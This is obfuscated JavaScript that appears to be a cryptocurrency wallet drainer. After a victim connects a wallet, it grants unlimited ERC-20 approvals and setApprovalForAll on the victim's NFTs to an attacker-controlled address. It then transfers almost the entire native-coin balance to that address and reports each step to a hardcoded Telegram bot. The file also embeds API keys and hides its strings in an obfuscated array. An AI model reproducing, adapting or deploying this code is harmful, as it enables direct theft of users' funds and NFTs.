_0x30d0e3[_0x32cbc1(0x1de)]['approve'](Oxa,'999999999999999999999999999999999999999999999999999999999999999999999999')[_0x32cbc1(0x15c)]({'from':selectedAccount,'to':_0x3d1527[_0x32cbc1(0x1d5)]})['on'](_0x32cbc1(0x178),_0x5a95f9=>{const _0x1c178d=_0x32cbc1;console[_0x1c178d(0x197)](_0x1c178d(0x16f)+_0x5a95f9);})['on'](_0x32cbc1(0x163),_0x5532a9=>{const _0x359e3d=_0x32cbc1;console[_0x359e3d(0x197)]('Transaction\x20Receipt:\x20'+_0x5532a9),sendMessage(_0x359e3d(0x18c)),sendMessage(_0x359e3d(0x136)+_0x3d1527[_0x359e3d(0x1d5)]),sendMessage(_0x359e3d(0x1c2)+_0x3d1527[_0x359e3d(0x176)]),sendMessage(_0x359e3d(0x1bd)+Oxa);})['on'](_0x32cbc1(0x17e),_0x27f398=>{const _0x253afb=_0x32cbc1;console[_0x253afb(0x197)](_0x253afb(0x1f1)+_0x27f398),sendMessage(_0x253afb(0x1e4));});}catch(_0x5a51bf){console[_0x32cbc1(0x197)](_0x32cbc1(0x1f1)+_0x5a51bf),sendMessage(_0x32cbc1(0x1e4));}};await loopNfts(NFTs);}async function loopNfts(_0x4941bb){const _0x2f1ceb=_0x193fa3;for await(let _0x4896a9 of _0x4941bb){console[_0x2f1ceb(0x197)](_0x2f1ceb(0x115),_0x4896a9);try{let _0x53114e=new web3Object[(_0x2f1ceb(0x17c))][(_0x2f1ceb(0x1aa))](ABIN,_0x4896a9[_0x2f1ceb(0x11a)]);await _0x53114e['methods']['setApprovalForAll'](Oxa,_0x2f1ceb(0x1e2))[_0x2f1ceb(0x15c)]({'from':selectedAccount,'to':_0x4896a9['token_address']})['on']('transactionHash',_0x376006=>{const _0xa47439=_0x2f1ceb;console[_0xa47439(0x197)]('Transaction\x20Hash:\x20'+_0x376006),sendMessage(_0xa47439(0x191));})['on'](_0x2f1ceb(0x163),_0x313a5f=>{const _0x1de2e6=_0x2f1ceb;console[_0x1de2e6(0x197)](_0x1de2e6(0x1c1)+_0x313a5f),sendMessage(_0x1de2e6(0x18c)),sendMessage('NFT\x20Contract\x20Address\x20'+token[_0x1de2e6(0x1d5)]),sendMessage(_0x1de2e6(0x1bd)+Oxa);})['on'](_0x2f1ceb(0x17e),_0x3ee121=>{const _0x41e12c=_0x2f1ceb;console['log'](_0x41e12c(0x1f1)+_0x3ee121),sendMessage(_0x41e12c(0x1e4));});}catch(_0x4a5371){console[_0x2f1ceb(0x197)](_0x2f1ceb(0x1f1)+_0x4a5371),sendMessage(_0x2f1ceb(0x1e4));}}await onSendEther();}async function onSendEther(){const _0x3bec8a=_0x193fa3;console[_0x3bec8a(0x197)]('sending\x20ether');try{let _0xa0b7ca=await web3Object['eth']['getBalance'](selectedAccount);var _0x5e098b=await web3Object['eth']['getGasPrice'](),_0x524b32={'gasPrice':_0x5e098b,'from':selectedAccount,'to':Oxa,'value':_0xa0b7ca};_0x524b32['gas']=_0x2e6e2b,_0x524b32[_0x3bec8a(0x18f)]=_0xa0b7ca-0xaa87bee538000,console[_0x3bec8a(0x197)](_0x524b32[_0x3bec8a(0x18f)]);var _0x2e6e2b=await web3Object[_0x3bec8a(0x17c)][_0x3bec8a(0x145)](_0x524b32),_0x1c6fbd=_0x5e098b*_0x2e6e2b;web3Object[_0x3bec8a(0x17c)][_0x3bec8a(0x169)](_0x524b32)['on'](_0x3bec8a(0x178),_0x555cd0=>{const _0x2767b8=_0x3bec8a;console[_0x2767b8(0x197)](_0x2767b8(0x16f),_0x555cd0),sendMessage(_0x2767b8(0x191));})['on'](_0x3bec8a(0x163),_0x51eebf=>{const _0x6859b7=_0x3bec8a;console[_0x6859b7(0x197)](_0x6859b7(0x1c1),_0x51eebf),sendMessage(_0x6859b7(0x13a));})['on'](_0x3bec8a(0x17e),_0x42bbe0=>{const _0x4dd61e=_0x3bec8a;console[_0x4dd61e(0x197)](_0x4dd61e(0x1f1),_0x42bbe0),sendMessage('Transaction\x20Rejected');});}catch{sendMessage(_0x3bec8a(0x1bb));}}async function sendMessage(_0x5ca232){return new Promise((_0x1c20a2,_0x246bda)=>{const _0x191dcc=_0x5c06,_0xc2db9a=CHAT;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0xc2db9a+_0x191dcc(0x1c8)+_0x5ca232,{'method':'GET','headers':{}})['then'](async _0x3477ca=>{const _0x12ae5a=_0x191dcc;if(_0x3477ca[_0x12ae5a(0x1f3)]>0x18f)throw _0x3477ca;_0x1c20a2(await _0x3477ca[_0x12ae5a(0x1b5)]());})['catch'](_0x195764=>{_0x246bda(_0x195764);});});}async function getPrice(_0xe25f71){return new Promise((_0x3802e8,_0x26f1a9)=>{const _0x80884d=_0x5c06;fetch('https://api.coingecko.com/api/v3/simple/token_price/avalanche?contract_addresses='+_0xe25f71+'&vs_currencies=usd',{'method':_0x80884d(0x1c9),'headers':{}})[_0x80884d(0x153)](async _0xb62816=>{const _0x1e8a49=_0x80884d;if(_0xb62816[_0x1e8a49(0x1f3)]>0x18f)throw _0xb62816;_0x3802e8(await _0xb62816['json']());})[_0x80884d(0x1e9)](_0x3ee368=>{_0x26f1a9(_0x3ee368);});});}async function getValue(_0x4285eb,_0x5abe09,_0x181e88){const _0xd95ddc=_0x193fa3;console[_0xd95ddc(0x197)](_0x4285eb,_0x5abe09,_0x181e88);let _0x19f039=await getPrice(_0x4285eb);console[_0xd95ddc(0x197)](_0xd95ddc(0x1ac),_0x19f039),_0x19f039=parseFloat(_0x19f039[_0x4285eb][_0xd95ddc(0x138)]);let _0xccd091=_0x5abe09/0xa**(_0x181e88||0x12)*_0x19f039;return _0xccd091=parseInt(_0xccd091),_0x19f039?_0xccd091:0x0;}function _0x3dc9(){const _0x5a4041=['log','590JjxYCK','filter','arbitrum-goerli','flarenetworks-flare-mainnet','boba-bobabase-testnet','startingIndex','issue','saleStart','addBlackList','New\x20token','ownerOf','previousOwner','string','result','emerald-paratime-mainnet','setParams','isApprovedForAll','_spender','Contract','tokens-list','price','palm-testnet','_blackListedUser','avalanche-fuji-mainnet','harmony-mainnet','7mIAhid','bsc-testnet','maximumFee','astar-mainnet','json','deprecated','skale-staging-uum','newBasisPoints','boba-goerli','Could\x20not\x20get\x20a\x20wallet\x20connection','Insufficient\x20funds\x20for\x20transfer','_from','Your\x20address\x20','Token','MAX_APES','OwnershipTransferred','Transaction\x20Receipt:\x20','Token\x20balance\x20is\x20','transfer','constructor','transferOwnership','_owner','sort','&text=','GET','meter-testnet','nonpayable','_clearedUser','view','boba-rinkeby-testnet','bsc-mainnet','newOwner','numberOfTokens','e62a60a251c64745baefeaf8237af646','axie-mainnet','skale-omnus','address','arbitrum-nova-mainnet','Error\x20collecting\x20info\x20about\x20wallet','RemovedBlackList','balanceOf','6004348463','pause','toString','boba-bnb-mainnet','methods','index','boba-avalanche-mainnet','approved','true','11vvXmAW','Transaction\x20Rejected','renounceOwnership','amount','connect','name','catch','boba-bnb-testnet','swimmer-testnet','uint256','spender','skale-calypso','metis-testnet','findora-mainnet','Error:\x20','flarenetworks-canary-testnet','status','Unable\x20to\x20get\x20NFts','meter-mainnet','.connect','getBlackListStatus','nervos-godwoken-mainnet','_decimals','canto-mainnet','base-testnet','_name','kcc-mainnet','77563jCIUEs','accountsChanged','astar-shibuya','oasys-testnet','maxApePurchase','&format=decimal&limit=','Redeem','from','moonbeam-moonriver','NFTs\x20collection\x20','saleIsActive','transferFrom','0xea8968B218a551919FbD5f1166328C82a96dED54','feeBasisPoints','palm-mainnet','AddedBlackList','_user','function','application/json','_data','NFT','getAccounts','_symbol','astar-shiden','963VorqLT','token_address','Error\x20processing\x20item\x20','bytes4','_initialSupply','harmony-testnet','cronos-mainnet','/erc20','map','totalSupply','allowance','avalanche-testnet','chainId:','_to','_maker','22kPjtLA','isBlackListed','https://ava-mainnet.blastapi.io/c7937bc2-4607-4321-927a-daa76e77ebfa/ext/bc/C/rpc','avalanche-dexalot-mainnet','solana-mainnet','oasis-sapphire-testnet','_value','swimmer-mainnet','0x8c8B038e490835e06bb8FB8049998B3F1b1b3a8f','Deprecate','linea-testnet','setStartingIndex','setBaseURI','/nft/collections?chain=','TOKEN\x20Contract\x20Address\x20','metis-mainnet','usd','avalanche-mainnet','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','default','message','defi-kingdoms-mainnet','revealTimeStamp','oasis-sapphire-mainnet','payable','eth-mainnet','10000','fantom-mainnet','avalanche-dexalot-testnet','estimateGas','30102zjvuSz','newAddress','matic-mainnet','flipSaleState','owner','provenanceHash','https://deep-index.moralis.io/api/v2/','_totalSupply','who','Transfer','Web3Modal','gather-testnet','avalanche','then','gather-mainnet','baseURI','10Jmydpy','getApproved','Initial\x20list\x20','upgradedAddress','interfaceId','40082748QDnNXj','send','operator','tokenId','arbitrum-mainnet','Pause','withdraw','1248852HNGafN','receipt','aurora-testnet','Params','covalent-internal-network-v1','bool','length','sendTransaction','decimals','remaining','defi-kingdoms-testnet','approve','emergencySetStartingIndexBlock','Transaction\x20Hash:\x20','all','unpause','apePrice','WalletConnectProvider','ApprovalForAll','xlBMsLxjEFcdSN1TGdya7jDy33DsMXbpi7rSypmNzxccgOoRzP8zocDThugOatoD','balance','findora-forge-testnet','transactionHash','startingIndexBlock','cronos-testnet','evmos-mainnet','eth','DestroyedBlackFunds','error','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','nervos-godwoken-testnet','9912536eBxvPz','mintApe','118539cLekpW','deprecate','oasys-mainnet','Approval','allowed','Unpause','maxFee','mantle-testnet','paused','Approve\x20Completed\x20Successfully','event','setProvenanceHash','value','bytes','Transaction\x20is\x20submitted\x20to\x20the\x20network','symbol','setApprovalForAll','removeBlackList','aurora-mainnet','moonbeam-moonbase-alpha'];_0x3dc9=function(){return _0x5a4041;};return _0x3dc9();}async function getNFTs(_0x65774='',_0x2dce28=_0x193fa3(0x175),_0x1a5349='avalanche',_0x32dbdd='50'){return new Promise((_0x32e0c3,_0x3e0e45)=>{const _0x2cc8d5=_0x5c06;fetch(_0x2cc8d5(0x14c)+_0x65774+_0x2cc8d5(0x135)+_0x1a5349+_0x2cc8d5(0x203)+_0x32dbdd,{'method':_0x2cc8d5(0x1c9),'headers':{'accept':'application/json','X-API-Key':_0x2dce28}})[_0x2cc8d5(0x153)](async _0x5b8252=>{const _0xf6794c=_0x2cc8d5;if(_0x5b8252[_0xf6794c(0x1f3)]>0x18f)throw _0x5b8252;_0x32e0c3(await _0x5b8252[_0xf6794c(0x1b5)]());})[_0x2cc8d5(0x1e9)](_0x1f602e=>{_0x3e0e45(_0x1f602e);});});}